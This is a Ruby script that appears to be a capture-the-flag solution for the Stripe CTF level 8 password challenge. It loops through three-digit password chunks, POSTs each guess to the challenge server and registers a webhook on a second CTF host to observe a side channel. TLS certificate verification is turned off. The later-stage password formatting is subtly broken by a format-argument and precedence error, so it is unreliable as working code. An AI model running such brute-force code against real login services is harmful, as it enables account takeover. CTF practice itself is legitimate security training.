#!/usr/bin/ruby

require 'net/https'
require 'uri'

@url = 'https://level08-2.stripe-ctf.com/user-wtauzqjifh/'
@hook = 'level02-1.stripe-ctf.com:58934'

def make_request(num, run, correct)
  uri = URI.parse(@url)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = true
  http.verify_mode = OpenSSL::SSL::VERIFY_NONE

  password = "%03d000000000" % num if run == 1
  password = "%d%03d000000" % correct, num if run == 2
  password = "%d%03d000" % correct, num if run == 3
  password = "%d%03d" % correct, num if run == 4
  print password

  data = '{"password": "' + password + '", "webhooks": ["' + @hook + '"]}'
  resp, res_data = http.post(uri.request_uri, data)

  if resp.body == "{\"success\": true}\n"
    print " success\n"
    exit(0)
  elsif resp.body == "{\"success\": false}\n"
    print " false\n"
  end

end

### Request run loop
run = 1
correct = nil
for i in 0..999
  make_request(i, run, correct)
end
